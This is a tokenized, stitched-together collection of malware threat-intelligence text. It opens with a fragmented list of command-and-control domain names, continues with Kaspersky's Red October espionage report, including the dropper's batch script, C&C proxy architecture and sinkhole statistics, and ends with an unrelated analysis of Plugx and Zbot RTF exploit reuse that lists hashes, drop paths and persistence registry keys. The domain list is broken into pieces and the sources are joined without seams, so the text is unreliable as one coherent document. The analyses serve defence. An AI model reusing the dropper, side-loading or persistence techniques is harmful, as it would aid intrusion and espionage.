com test1 .
dns1 .
us fun .
marktie .
com test1 .
windwarp .
uicp .
net funnygamea .
vicp .
net thec .
csinfos .
net games .
jeepworker .
com timeout .
myvnc .
com games .
noorno .
com trans .
helpngr .
net googlemail .
servehttp .
com tttt .
sundaynews .
us googleupdate2009 .
kmip .
net tw .
pudnet .
net graymmy .
longmusic .
com uncrisis .
findhere .
org gws01 .
microupdata .
com update .
yourturbe .
org gws12 .
microupdata .
com usstream .
coyo .
eu hanoihcm .
phdns01 .
com venus .
gr8domain .
biz havefuns .
rkntils .
10dig .
net vstar-2006 .
vicp .
net henryclub .
25u .
com wakawaka .
servehttp .
com hfwwpofuyer .
4pu .
com webdata .
helpngr .
net homehost .
3322 .
org web .
nifty - login .
com https .
port25 .
biz web .
nifty - user .
com hyphen .
dyndns .
biz web .
yahoo - user .
com hzg002 .
mooo .
com wetboy .
vicp .
hk image .
google - login .
com winhelp .
yahoo - config .
com image .
qpoe .
com winserver .
3-a .
net info .
kembletech .
com wogawoga .
sytes .
net info .
rumorse .
com worldwide .
servehttp .
com info .
whandjg .
net wt .
pudnet .
net insert .
51vip .
biz wwmrus .
gicp .
net office - sevice .
com www12 .
sexidude .
com intrusion .
post - horse .
net www .
a1yac .
net it .
buglan .
com www .
avau .
info it .
davyhop .
com www .
ayfd .
info it .
pudnet .
net www .
butr .
info johnnees .
rkntils .
10dig .
net www .
catholicstory .
info kapa2000 .
3322 .
org www .
config .
sendsmtp .
com kimomail .
3-a .
net www .
drsc .
in korea001 .
tribeman .
com www .
firehorse .
changeip .
name korea1 .
mooo .
com www .
fsdr .
info kx .
davyhop .
com www .
google - login .
com lanama .
jkub .
com www .
greenhawthorn .
com lcyma .
jetos .
com www .
grtk .
info li .
noorno .
com www .
hgtw .
info livedoor .
microupdata .
com www .
jeepworker .
com login .
yahoo - user .
com www .
kkle .
info lovehill .
3d - game .
com www .
lconstruct .
com lovehill .
dyndns - blog .
com www .
linejudge .
net lovehill .
xxuz .
com www .
microsoft .
yourtrap .
com lsass .
google - login .
com www .
missingthegirl .
com luck201202 .
oicp .
net www .
nifty - japan .
com mail911 .
nifty - login .
com www .
noorno .
com mail911 .
nifty - user .
com www .
post - horse .
net mail91 .
nifty - login .
com www .
search .
wwwhost .
biz mail91 .
nifty - user .
com www .
setinfor .
proxydns .
com mail .
carsystm .
net www .
smtp2010 .
googleupdate .
hk mail .
lthreebox .
com www .
solarisc .
com mail .
mariofreegame .
net www .
superpowereye .
com mail .
mgtfcayman .
com www .
swf .
zyns .
com mail .
mofa .
zyns .
com www .
test1 .
dns1 .
us mailsrv .
mariofreegame .
net www .
tomdavid .
dns04 .
com mail .
systemsupdata .
com www .
windows .
dynamicdns .
org .
uk mail .
xygong .
com www .
wsdv .
info manpower .
3322 .
org xmahone .
51vip .
biz marhone .
vicp .
net xmahone .
gicp .
net mdb .
clawsnare .
com xmahone .
suroot .
com mf .
tpznet .
com yftpost .
flnet .
org microsoft .
redirect .
hm ynet .
nifty - login .
com mil .
winsupdate .
com ynet .
nifty - user .
com msnsupport .
servehttp .
com zp .
amazingrm .
com zp .
tpznet .
The `` Red October '' Campaign - An Advanced Cyber Espionage Network Targeting Diplomatic and Government Agencies Here 's a link to the full paper ( part 1 ) about our Red October research .
During the next days , we 'll be publishing Part 2 , which contains a detailed technical analysis of all the known modules .
Please stay tuned .
During the past five years , a high - level cyber - espionage campaign has successfully infiltrated computer networks at diplomatic , governmental and scientific research organizations , gathering data and intelligence from mobile devices , computer systems and network equipment .
Kaspersky Lab 's researchers have spent several months analyzing this malware , which targets specific organizations mostly in Eastern Europe , former USSR members and countries in Central Asia , but also in Western Europe and North America .
The campaign , identified as `` Rocra '' , short for `` Red October '' , is currently still active with data being sent to multiple command - and - control servers , through a configuration which rivals in complexity the infrastructure of the Flame malware .
Registration data used for the purchase of C & C domain names and PE timestamps from collected executables suggest that these attacks date as far back as May 2007 .
Some key findings from our investigation : The attackers have been active for at least five years , focusing on diplomatic and governmental agencies of various countries across the world .
Information harvested from infected networks is reused in later attacks .
For example , stolen credentials were compiled in a list and used when the attackers needed to guess passwords and network credentials in other locations .
To control the network of infected machines , the attackers created more than 60 domain names and several server hosting locations in different countries ( mainly Germany and Russia ) .
The C & C infrastructure is actually a chain of servers working as proxies and hiding the location of the true -mothership- command and control server .
The attackers created a multi - functional framework which is capable of applying quick extension of the features that gather intelligence .
The system is resistant to C & C server takeover and allows the attacker to recover access to infected machines using alternative communication channels .
Beside traditional attack targets ( workstations ) , the system is capable of stealing data from mobile devices , such as smartphones ( iPhone , Nokia , Windows Mobile ) ; dumping enterprise network equipment configuration ( Cisco ) ; hijacking files from removable disk drives ( including already deleted files via a custom file recovery procedure ) ; stealing e - mail databases from local Outlook storage or remote POP / IMAP server ; and siphoning files from local network FTP servers .
We have observed the use of at least three different exploits for previously known vulnerabilities : CVE-2009 - 3129 ( MS Excel ) , CVE-2010 - 3333 ( MS Word ) and CVE-2012 - 0158 ( MS Word ) .
The earliest known attacks used the exploit for MS Excel and took place in 2010 and 2011 , while attacks targeting the MS Word vulnerabilities appeared in the summer of 2012 .
The exploits from the documents used in spear phishing were created by other attackers and employed during different cyber attacks against Tibetan activists as well as military and energy sector targets in Asia .
The only thing that was changed is the executable which was embedded in the document ; the attackers replaced it with their own code .
Sample fake image used in one of the Rocra spear phishing attacks .
During lateral movement in a victim 's network , the attackers deploy a module to actively scan the local area network , find hosts vulnerable for MS08 - 067 ( the vulnerability exploited by Conficker ) or accessible with admin credentials from its own password database .
Another module used collected information to infect remote hosts in the same network .
Based on registration data of the C & C servers and numerous artifacts left in executables of the malware , we strongly believe that the attackers have Russian - speaking origins .
Current attackers and executables developed by them have been unknown until recently , they have never related to any other targeted cyber attacks .
Notably , one of the commands in the Trojan dropper switches the codepage of an infected machine to 1251 before installation .
This is required to address files and directories that contain Cyrillic characters in their names .
What is Rocra ? Where does the name come from ? Was Operation Rocra targeting any specific industries , organizations or geographical regions ? Rocra ( short for `` Red October '' ) is a targeted attack campaign that has been going on for at least five years .
It has infected hundreds of victims around the world in eight main categories : 1 .
Government 2 .
Diplomatic / embassies 3 .
Research institutions 4 .
Trade and commerce 5 .
Nuclear / energy research 6 .
Oil and gas companies 7 .
Aerospace 8 .
Military It is quite possible there are other targeted sectors which have n't been discovered yet or have been attacked in the past .
How and when was it discovered ? We have come by the Rocra attacks in October 2012 , at the request of one of our partners .
By analysing the attack , the spear phishing and malware modules , we understood the scale of this campaign and started dissecting it in depth .
Who provided you with the samples ? Our partner who originally pointed us to this malware prefers to remain anonymous .
How many infected computers have been identified by Kaspersky Lab ? How many victims are there ? What is the estimated size of Operation Red October on a global scale ? During the past months , we ' ve counted several hundreds of infections worldwide - all of them in top locations such as government networks and diplomatic institutions .
The infections we ' ve identified are distributed mostly in Eastern Europe , but there are also reports coming from North America and Western European countries such as Switzerland or Luxembourg .
Based on our Kaspersky Security Network ( KSN ) here 's a list of countries with most infections ( only for those with more than 5 victims ) : For the sinkhole statistics see below .
Who is behind / responsible for this operation ? Is this a nation - state sponsored attack ? The information we have collected so far does not appear to point towards any specific location , however , two important factors stand out : The exploits appear to have been created by Chinese hackers .
The Rocra malware modules have been created by Russian - speaking operatives .
Currently , there is no evidence linking this with a nation - state sponsored attack .
The information stolen by the attackers is obviously of the highest level and includes geopolitical data which can be used by nation states .
Such information could be traded in the underground and sold to the highest bidder , which can be of course , anywhere .
Are there any interesting texts in the malware that can suggest who the attackers are ? Several Rocra modules contain interesting typos and mis - spellings : network_scanner : `` SUCCESSED '' , `` Error_massage '' , `` natrive_os '' , `` natrive_lan '' imapispool : `` UNLNOWN_PC_NAME '' , `` WinMain : error CreateThred stop '' mapi_client : `` Default Messanger '' , `` BUFEER IS FULL '' msoffice_plugin : `` my_encode my_dencode '' winmobile : `` Zakladka injected '' , `` Can not inject zakladka , Error : % u '' PswSuperMailRu : `` -- -- -- -PROGA START -- -- - '' , `` -- -- -- -PROGA END -- -- - '' The word `` PROGA '' used in here might refer to transliteration of Russian slang `` ПРОГА '' , which literally means an application or a program among Russian - speaking software engineers .
In particular , the word `` Zakladka '' in Russian can mean : `` bookmark '' ( more likely ) a slang term meaning `` undeclared functionality '' , i.e .
in software or hardware .
However , it may also mean a microphone embedded in a brick of the embassy building .
The C++ class that holds the C & C configuration parameters is called `` MPTraitor '' and the corresponding configuration section in the resources is called `` conn_a '' .
Some examples include : What kind of information is being hijacked from infected machines ? Information stolen from infected systems includes documents with extensions : txt , csv , eml , doc , vsd , sxw , odt , docx , rtf , pdf , mdb , xls , wab , rst , xps , iau , cif , key , crt , cer , hse , pgp , gpg , xia , xiu , xis , xio , xig , acidcsa , acidsca , aciddsk , acidpvr , acidppr , acidssa .
In particular , the `` acid * '' extensions appear to refer to the classified software `` Acid Cryptofiler '' , which is used by several entities such as the European Union and/or NATO .
What is the purpose / objective of this operation ? What were the attackers looking for by conducting this sustained cyber - espionage campaign for so many years ? The main purpose of the operation appears to be the gathering of classified information and geopolitical intelligence , although it seems that the information gathering scope is quite wide .
During the past five years , the attackers collected information from hundreds of high profile victims although it 's unknown how the information was used .
It is possible that the information was sold on the black market , or used directly .
What are the infection mechanisms for the malware ? Does it have self - propagating ( worm ) capabilities ? How does it work ? Do the attackers have a customized attack platform ? The main malware body acts as a point of entry into the system which can later download modules used for lateral movement .
After initial infection , the malware wo n't propagate by itself - typically , the attackers would gather information about the network for a few days , identify key systems and then deploy modules which can compromise other computers in the network , for instance by using the MS08 - 067 exploit .
In general , the Rocra framework is designed for executing `` tasks '' that are provided by its C & C servers .
Most of the tasks are provided as one - time PE DLL libraries that are received from the server , executed in memory and then immediately discarded .
Several tasks however need to be constantly present in the system , i.e .
waiting for the iPhone or Nokia mobile to connect .
These tasks are provided as PE EXE files and are installed in the infected machine .
Examples of `` one - time '' tasks The Rocra framework was designed by the attackers from scratch and has n't been used in any other operations .
Was the malware limited to only workstations or did it have additional capabilities , such as a mobile malware component ? Several mobile modules exist , which are designed to steal data from several types of devices : These modules are installed in the system and wait for mobile devices to be connected to the victim 's machine .
When a connection is detected , the modules start collecting data from the mobile phones .
How many variants , modules or malicious files were identified during the overall duration of Operation Red October ? During our investigation , we ' ve uncovered over 1000 modules belonging to 30 different module categories .
These have been created between 2007 with the most recent being compiled on 8th Jan 2013 .
Here 's a list of known modules and categories : Were initial attacks launched at select `` high - profile '' victims or were they launched in series of larger ( wave ) attacks at organizations / victims ? All the attacks are carefully tuned to the specifics of the victims .
For instance , the initial documents are customized to make them more appealing and every single module is specifically compiled for the victim with a unique victim ID inside .
Later , there is a high degree of interaction between the attackers and the victim - the operation is driven by the kind of configuration the victim has , which type of documents the use , installed software , native language and so on .
Compared to Flame and Gauss , which are highly automated cyberespionage campaigns , Rocra is a lot more `` personal '' and finely tuned for the victims .
Is Rocra related in any way to the Duqu , Flame and Gauss malware ? Simply put , we could not find any connections between Rocra and the Flame / Tilded platforms .
How does Operation Rocra compare to similar campaigns such as Aurora and Night Dragon ? Any notable similarities or differences ? Compared to Aurora and Night Dragon , Rocra is a lot more sophisticated .
During our investigation we 've uncovered over 1000 unique files , belonging to about 30 different module categories .
Generally speaking , the Aurora and Night Dragon campaigns used relatively simple malware to steal confidential information .
With Rocra , the attackers managed to stay in the game for over 5 years and evade detection of most antivirus products while continuing to exfiltrate what must be hundreds of Terabytes by now .
How many Command & Control servers are there ? Did Kaspersky Lab conduct any forensic analysis on them ? During our investigation , we uncovered more than 60 domain names used by the attackers to control and retrieve data from the victims .
The domain names map to several dozen IPs located mostly in Russia and Germany .
Here 's an overview of the Rocra 's command and control infrastructure , as we believe it looks from our investigations : More detailed information about the Command and Control servers will be revealed at a later date .
Did you sinkhole any of the Command & Control servers ? We were able to sinkhole six of the over 60 domains used by the various versions of the malware .
During the monitoring period ( 2 Nov 2012 - 10 Jan 2013 ) , we registered over 55,000 connections to the sinkhole .
The number of different IPs connecting to the sinkhole was 250 .
From the point of view of country distribution of connections to the sinkhole , we have observed victims in 39 countries , with most of IPs being from Switzerland .
Kazakhstan and Greece follow next .
Sinkhole statistics - 2 Nov 2012 - 10 Jan 2013 Is Kaspersky Lab working with any governmental organizations , Computer Emergency Response Teams ( CERTs ) , law enforcement agencies or security companies as part of the investigation and disinfection efforts ? Kaspersky Lab , in collaboration with international organizations , Law Enforcement , Computer Emergency Response Teams ( CERTs ) and other IT security companies is continuing its investigation of Operation Red October by providing technical expertise and resources for remediation and mitigation procedures .
Kaspersky Lab would like to express their thanks to : US - CERT , the Romanian CERT and the Belarusian CERT for their assistance with the investigation .
If you are a CERT and would like more information about infections in your country , please contact us at theflame @ kaspersky.com .
Here 's a link to the full paper ( part 1 ) about our Red October research .
During the next days , we 'll be publishing Part 2 , which contains a detailed technical analysis of all the known modules .
Please stay tuned .
Contents In October 2012 , Kaspersky Lab 's Global Research & Analysis Team initiated a new threat research after a series of attacks against computer networks of various international diplomatic service agencies .
A large scale cyber - espionage network was revealed and analyzed during the investigation , which we called `` Red October '' ( after famous novel `` The Hunt For The Red October '' ) .
This report is based on detailed technical analysis of a series of targeted attacks against diplomatic , governmental and scientific research organizations in different countries , mostly related to the region of Eastern Europe , former USSR members and countries in Central Asia .
The main objective of the attackers was to gather intelligence from the compromised organizations , which included computer systems , personal mobile devices and network equipment .
The earliest evidence indicates that the cyber - espionage campaign was active since 2007 and is still active at the time of writing ( January 2013 ) .
Besides that , registration data used for the purchase of several Command & Control ( C & C ) servers and unique malware filenames related to the current attackers hints at even earlier time of activity dating back to May 2007 .
Advanced Cyber - espionage Network : The attackers have been active for at least several years , focusing on diplomatic and governmental agencies of various countries across the world .
Information harvested from infected networks was reused in later attacks .
For example , stolen credentials were compiled in a list and used when the attackers needed to guess secret phrase in other locations .
To control the network of infected machines , the attackers created more than 60 domain names and several server hosting locations in different countries ( mainly Germany and Russia ) .
The C & C infrastructure is actually a chain of servers working as proxies and hiding the location of the ' mothership ' control server .
Unique architecture : The attackers created a multi - functional kit which has a capability of quick extension of the features that gather intelligence .
The system is resistant to C & C server takeover and allows the attack to recover access to infected machines using alternative communication channels .
Broad variety of targets : Beside traditional attack targets ( workstations ) , the system is capable of stealing data from mobile devices , such as smartphones ( iPhone , Nokia , Windows Mobile ) , enterprise network equipment ( Cisco ) , removable disk drives ( including already deleted files via a custom file recovery procedure ) .
Importation of exploits : The samples we managed to find were using exploit code for vulnerabilities in Microsoft Word and Microsoft Excel that were created by other attackers and employed during different cyber attacks .
The attackers left the imported exploit code untouched , perhaps to harden the identification process .
Attacker identification : Basing on registration data of C & C servers and numerous artifacts left in executables of the malware , we strongly believe that the attackers have Russian - speaking origins .
Current attackers and executables developed by them have been unknown until recently , they have never related to any other targeted cyberattacks .
General description These attacks comprised of the classical scenario of specific targeted attacks , consisting of two major stages : 1 .
Initial infection 2 .
Additional modules deployed for intelligence gathering The malicious code was delivered via e - mail as attachments ( Microsoft Excel , Word and , probably PDF documents ) which were rigged with exploit code for known security vulnerabilities in the mentioned applications .
In addition to Office documents ( CVE-2009 - 3129 , CVE-2010 - 3333 , CVE-2012 - 0158 ) , it appears that the attackers also infiltrated victim network ( s ) via Java exploitation ( known as the ' Rhino ' exploit ( CVE-2011 - 3544 ) .
Right after the victim opened the malicious document or visit malicious URL on a vulnerable system , the embedded malicious code initiated the setup of the main component which in turn handled further communication with the C & C servers .
Next , the system receives a number of additional spy modules from the C & C server , including modules to handle infection of smartphones .
The main purpose of the spying modules is to steal information .
This includes files from different cryptographic systems , such as `` Acid Cryptofiler '' , ( see https : //fr.wikipedia.org / wiki / Acid_Cryptofiler ) which is known to be used in organizations of European Union / European Parliament / European Commission since the summer of 2011 .
All gathered information is packed , encrypted and only then transferred to the C & C server .
Step - by - step description ( 1st stage ) During our investigation we could n't find any e - mails used in the attacks , only top level dropper documents .
Nevertheless , based on indirect evidence , we know that the e - mails can be sent using one of the following methods : Using an anonymous mailbox from a free public email service provider Using mailboxes from already infected organizations E - mail subject lines as well as the text in e - mail bodies varied depending on the target ( recipient ) .
The attached file contained the exploit code which activated a Trojan dropper in the system .
We have observed the use of at least three different exploits for previously known vulnerabilities : CVE- 2009 - 3129 ( MS Excel ) , CVE-2010 - 3333 ( MS Word ) and CVE-2012 - 0158 ( MS Word ) .
The first attacks that used the exploit for MS Excel started in 2010 , while attacks targeting the MS Word vulnerabilities appeared in the summer of 2012 .
As a notable fact , the attackers used exploit code that was made public and originally came from a previously known targeted attack campaign with Chinese origins .
The only thing that was changed is the executable which was embedded in the document ; the attackers replaced it with their own code .
The embedded executable is a file - dropper , which extracts and runs three additional files .
% TEMP % MSC.BAT % ProgramFiles % WINDOWS NTLHAFD.GCP ( < - This file name varies ) % ProgramFiles % WINDOWS NTSVCHOST.EXE MSC.BAT file has the following contents : chcp 1251 : Repeat attrib -a -s -h -r `` % DROPPER_FILE % '' del `` % DROPPER_FILE % '' if exist `` % DROPPER_FILE % '' goto Repeat del `` % TEMP % msc.bat '' Another noteworthy fact is in the first line of this file , which is a command to switch the codepage of an infected system to 1251 .
This is required to address files and directories that contain Cyrillic characters in their names .
The `` LHAFD.GCP '' file is encrypted with RC4 and compressed with the `` Zlib '' library .
This file is essentially a backdoor , which is decoded by the loader module ( svchost.exe ) .
The decrypted file is injected into system memory and is responsible for communication with the C & C server .
On any infected system , every major task is performed by the main backdoor component .
The main component is started only after its loader ( `` svchost.exe '' ) checks if the internet connection is available .
It does so by connecting to three Microsoft hosts : update.microsoft.com www.microsoft.com support.microsoft.com After the Internet connection is validated , the loader executes the main backdoor component that connects to its C & C servers : The connections with the C & C are encrypted - different encryption algorithms are used to send and receive data .
During our investigation , we found more than 60 different command - and - control domains .
Each malware sample contains three such domains , which are hardcoded inside the main backdoor component : Step - by - step description ( 2nd stage ) After a connection with the C & C server is established , the backdoor starts the communication process , which leads to the loading of additional modules .
These modules can be split into two categories : `` offline '' and `` online '' .
The main difference between these categories is their behavior on the infected system : `` Offline '' : exists as files on local disk , capable of creating its own system registry keys , local disk log files , and may communicate with C & C servers on their own .
`` Online '' : exists only in system memory and is never saved to local disk , do not create registry keys , all logs are also kept in memory instead of local disk and sends the result of work to the C & C server using own code .
There is a notable module among all others , which is essentially created to be embedded into Adobe Reader and Microsoft Office applications .
The main purpose of its code is to create a foolproof way to regain access to the target system .
The module expects a specially crafted document with attached executable code and special tags .
The document may be sent to the victim via e - mail .
It will not have an exploit code and will safely pass all security checks .
However , like with exploit case , the document will be instantly processed by the module and the module will start a malicious application attached to the document .
This trick can be used to regain access to the infected machines in case of unexpected C & C servers shutdown / takeover .
We have identified over 1000 different malicious files related to over 30 modules of this Trojan kit .
Most of them were created between May 2010 and October 2012 .
There were 115 file - creation dates identified which are related to these campaigns via emails during the last two and a half years .
Concentration of file creation dates around a particular day may indicate date of the massive attacks ( which was also confirmed by some of our side observations ) : Year 2010 19.05.2010 21.07.2010 04.09.2010 Year 2011 05.01.2011 14.03.2011 05.04.2011 23.06.2011 06.09.2011 21.09.2011 Year 2012 12.01.2012 Below is a list of sample attachment filenames that were sent to some of the victims : File name : Katyn_-_opinia_Rosjan.xls FIEO contacts update.xls spisok sotrudnikov.xls List of shahids.xls Spravochnik.xls Telephone.xls BMAC Attache List - At 11 Oct_v1 [ 1 ] .XLS
MERCOSUR_Imports.xls Cópia de guia de telefonos ( 2 ) .xls
Programme de fetes 2011.xls 12 05 2011 updated.xls telefonebi.xls We used two approaches to identify targets for these attacks .
First , we used the Kaspersky Security Network ( KSN ) and then we set up our own sinkhole server .
The data received using two independent ways was correlating and this confirmed objective findings .
The attackers used already detected exploit codes and because of this , in the beginning of the research we already had some statistics of detections with our anti - malware software .
We searched for similar detections for the period of 2011 - 2012 .
That is how we discovered more than 300 unique systems , which had detected at least one module of this Trojan kit .
Once again , this is based on data from Kaspersky AV products .
Apparently , real number and list of victim names is much larger than mentioned above .
During our analysis , we uncovered more than 60 different domains used by different variants of the malware .
Out of the list of domains , several were expired so we registered them to evaluate the number of victims connecting to them .
The following domains have been registered and sinkholed by Kaspersky Lab : All the sinkholed domains currently point to `` 95.211.172.143 '' , which is Kasperskys ' sinkhole server .
During the monitoring period ( 2- Nov 2012 - 10 Jan 2013 ) , we registered over 55,000 connections to the sinkhole .
The most popular domain is `` dll-host-update.com '' , which is receiving most of the traffic .
From the point of view of country distribution of connections to the sinkhole , we have observed victims in 39 countries , with most of IPs being from Switzerland .
Kazakhstan and Greece follow next .
Interestingly , when connecting to the sinkhole , the backdoors submit their unique victim ID , which allows us to separate the multiple IPs per victims .
Based on the traffic received to our sinkhole , we created the following list of unique victim IDs , countries and possible profiles : In some cases , it is possible to create a profile of the victim based on the IP address ; in most of the cases , however , the identity of the victim remains unknown .
Some of the victim organizations were identified using IP addresses and public WHOIS information or remote system names .
Most `` interesting '' out of those are : A list of the most popular domains used for command and control can be found below : Interestingly , although the domain `` dll-host-update.com '' appears in one of the malware configurations , it had not been registered by the attackers .
The domain has since been registered by Kaspersky Lab on Nov 2nd , 2012 to monitor the attacker 's activities .
Another interesting example is `` dll-host-udate.com '' - the `` udate '' part appears to be a typo .
All the domains used by attackers appear to have been registered between 2007 - 2012 .
The oldest known domain was registered in Nov 2007 ; the newest on May 2012 .
Most of the domains have been registered using the service `` reg.ru '' , but other services such as '' webdrive.ru '' , `` webnames.ru '' or `` timeweb.ru '' have been used as well .
During our monitoring , we observed the domains pointing to several malicious webservers .
A list of servers with confirmed malicious behavior can be found below .
In total , we have identified 10 different servers which exhibited confirmed malicious behavior .
Most of these severs are located in Germany , at Hetzner Online Ag .
During our analysis , we were able to obtain an image of one of the command - and - control servers .
The server itself proved to be a proxy , which was forwarding the request to another server on port 40080 .
The script responsible for redirections was found in /root / scp.pl and relies on the `` socat '' tool for stream redirection .
By scanning the Internet for computers with port 40080 open , we were able to identify three such servers in total , which we call `` mini - motherships '' : Connecting to these hosts on port 40080 and fetching the index page , we get the following standard content which is identical in all C & Cs : Fetching the index info ( via HTTP `` HEAD '' ) for these servers , reveals the following : It should be noted that the `` last modified '' field of the pages points to the same date : Tue , 21 Feb 2012 09:00:41 GMT .
This is important and probably indicates that the three known mini - motherships are probably just proxies themselves , pointing to the same top level `` mothership '' server .
This allows us to draw the following diagram of the C & C infrastructure as of November 2012 : For the Command and Control servers , the various generations of the backdoor connect to different scripts : For instance , the script `` /cgi - bin / nt / th '' is being used to receive commands from the command - and- control server , usually in the form of new plugins to run on the victim 's computer .
The `` /cgi - bin / nt / sk '' script is called by the running plugins to upload stolen data and information about the victim .
When connecting to the C & C , the backdoor identifies itself with a specific string which includes a hexadecimal value that appears to be the victim 's unique ID .
Different variants of the backdoor contain different victim IDs .
Presumably , this allows the attackers to distinguish between the multitudes of connections and perform specific operations for each victim individually .
For instance , a top level XLS dropper presumably used against a Polish target , named `` Katyn_- _ opinia_Rosjan.xls '' contains the hardcoded victim ID `` F50D0B17F870EB38026F '' .
A similar XLS named '' tactlist_05 - 05 - 2011_.8634.xls / EEAS New contact list ( 05 - 05 - 2011 ) .xls
'' possibly used in Moldova contains a victim ID `` FCF5E48A0AE558F4B859 '' .
Part 2 of this paper will cover malware modules and provide more technical details about their operation .
Malware authors are not shy about borrowing ideas .
One of the most typical cases is the Tomato Garden case , where several different groups used the same zero - day Microsoft Word exploit .
The term `` used '' means that they somehow get hold of a document that exploited the vulnerability , and then left the exploiting document part and the shellcode intact , only changed the appended encrypted executable at the end , and immediately they had what needed .
Something very similar happened just recently , in August and September of 2014 .
I always wanted to know how the malware writing groups worked .
I mean the really serious ones , the ones behind Chinese state - sponsored APT attacks , or the groups behind high profile common malware , like Zeus .
This case offers another piece of insight .
There must have been a staff meeting , where the manager prompted that , in the next malware distribution campaign they should not only use the aging CVE-2012 - 0158 vulnerability , but the newer CVE-2014 - 1761 as well .
The rest of the document will detail how some of the groups coped with this task .
Clearly , the malware authors took a sample somehow and started the implementation process .
I was n't there , of course , so what follows is an educated guess based on the samples .
Recently we saw a lot of samples that exploit both CVE-2012 - 0158 and CVE-2014 - 1761 , and usually either download or drop a Zbot variant .
The document starts with the RTF header stuff , followed by the encrypted second stage .
This is followed by the embedded object exploiting the CVE-2012 - 0158 vulnerability with the shellcode .
Following it is a block exploiting the CVE-2014 - 1761 with a shellcode of its own , as illustrated in the image below .
The color scheme I will use in the rest of the document is the following : green represents the properly used components ; yellow the unused components ; and red the incorrectly used components .
Regardless of the particular exploit used , both shellcodes performed the memory egg - hunting for the memory markers of the second stage ( as described in ) , and decrypted it when found .
The second stage could be either a downloader shellcode or a Win32 executable .
One of these samples was SHA1 : c3a7cb43ec13299b758cb8ca25eace71329939f7 , which contained an encrypted Zbot variant at the beginning of the RTF .
It looks very likely that this sample was used as a development template for the other malware writing groups .
The first attempt must have come from the group deploying Plugx .
They took the above mentioned sample , and made some modifications to it .
The result looks like this one : I can only guess that they did n't understand the CVE-2014 - 1761 component , and thought that there was only one shellcode , in the CVE-2012 - 0158 segment .
So they appended the encrypted Plugx executable , and replaced the first shellcode with their own .
This shellcode contains the hardcoded offset of the embedded executable , and decrypts from there .
However , they left intact the encrypted Zbot executable at the beginning of the file and the second vulnerability , making this sample a real dual weapon : not only that it exploits two vulnerabilities , but contains two totally different payloads .
However , Word can only be exploited once : during the exploitation procedure the current instance of Word exits , and a new one is started that displays the decoy document .
So this creates a race condition : whichever vulnerability is triggered first ( or gets lucky in an environment where the other one is patched ) will have the chance to run its own payload .
13effaca957cc362bdcbfdd05b5763205b53d9ca Original name : N / A At some point they must have realized that it was wrong and tried to fix the CVE-2014 - 1761 part .
For that , they took another recent sample , something similar to those that drop Goldsun Trojans ( like this SHA1 : e2474cc0da5a79af876771217eb81974e73c39e5 ) In this case , the RTF only contains the CVE-2014 - 1761 vulnerability , with an appended executable .
The vulnerability expects the second stage shellcode at a fixed file offset , checks a marker string there ( `` p ! 11 '' ) , and jumps to the second stage , which then decrypts and executes the final Win32 payload .
A large group of samples were created by a sort of a fusion of the Zbot and the Goldsun samples , resulting in a structure like this one : So now there are two different shellcodes .
The first , from Plugx , reads the length of the embedded decoy document and Win32 payload from the end of the file , and using this info locates and decrypts the appended payload .
This shellcode identifies the host document by checking if the last dword is the same as the dword before that rotated by 3 .
And the same holds for another two dwords before that .
These dwords also store the length of the appended PE payload and decoy document lengths .
This structure makes it possible to swap the payload without changing the exploit and shellcode part .
The shellcode from Goldsun executes the second stage code from a fixed offset .
There are a couple of problems with this implementation .
First , the defunctional encrypted Zbot remains in these files , with no purpose at all .
But the real problem is with the Goldsun style CVE-2014 - 1761 block .
It was snatched from the CVE-2014 - 1761 exploiting document , and pasted after the existing Zbot+CVE-2012 - 0158 combo .
Clearly , the offset where the second stage code would be shifted with the different prepended content , but it never happened .
As a result , the CVE-2014 - 1761 exploitation does n't work , despite all the efforts of the malware authors .
A couple of distinct malware groups were identified that use these schematics .
All of these samples are Plugx v2 samples .
Most of the time they use Russian related themes in the decoy document .
The dropped decoy document does n't contain anything , it is only blank page .
Dropped to C : \Documents and Settings\All Users\DRM\AShld\AShld.exe ( clean loader , digitally signed by McAfee ) and C : \Documents and Settings\All Users\DRM\AShld\AShldRes . DLL ( malware loader ) and C : \Documents and Settings\All Users\DRM\AShld\AShldRes . DLL.asr ( payload ) ; registered for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\ AShld → ImagePath The payload is next generation Plugx , plugin function creation dates are 0x20130810 .
Two of the Plugx samples turned out to be very new developments .
Similar samples were just recently encountered from the list generated by a researcher .
176273806e6fe338123ff660e70145935bac77c3 Original name : РЕЗЮМЕ.doc The payload is next generation Plugx [ 4 ] , plugin function creation dates are 20140719 ( and interestingly , decimal and not hexadecimal , as generally seen in Plugx ) .
Additionally , it has some internal function names not seen in earlier Plugx versions : ZX , ZXWT , JP1 , JP2 , JP3 , JP4 , JP5 , JAP0 , JAP1 Dropped to C : \Documents and Settings\All Users\DRM\KavSky\m.exe ( clean loader , digitally signed by Kaspersky ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll ( malware loader ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll.eng ( payload ) ; registered in for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\KavSky → ImagePath The payload is next generation Plugx , plugin function creation dates are 20140719 decimal .
Additionally , it has some internal function names not seen in earlier Plugx versions : ZX , ZXWT , JP1 , JP2 , JP3 , JP4 , JP5 , JAP0 , JAP1 This sample used a Myanmar related decoy theme , likely part of a separate distribution campaign .
indiasceus.jetos.com indiasceus.justdied.com Dynamic DNS service Dynamic DNS service These are new Trojans .
Not connected to Plugx at code level , but the overlap between the C & C servers , the same domain registration contact ( yuminga1 @ 126.com ) , and the similar Russian theme indicates that the same group deployed them .
0dfd883c1f205f0740d50688683f1869bcc0e9d7 Original name : План космической деятельности на 2021 - 2025 год.doc Dropped to % WINDOWS % \AppPatch\AcProtect.dll ( SHA1 : 994be9c340f57ba8cbb20b7ceedad49b00294f3e ) and % WINDOWS % \AppPatch\msimain.mui ( separate payload file ) .
Registered for startup with unusual autostart method , briefly touched in .
A Microsoft patch file is dropped to % WINDOWS % \AppPatch\Custom\ { 099BF1AE-6A93- 493D-0C48 - 2453E7FBC801 } .sdband
registered to load in HKLM\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB .
That file loads AcProtect.dll as a library component .
The dumped payload shows similar functionality to what Plugx ( or any other general purpose backdoor ) has , but on a code level it is very different .
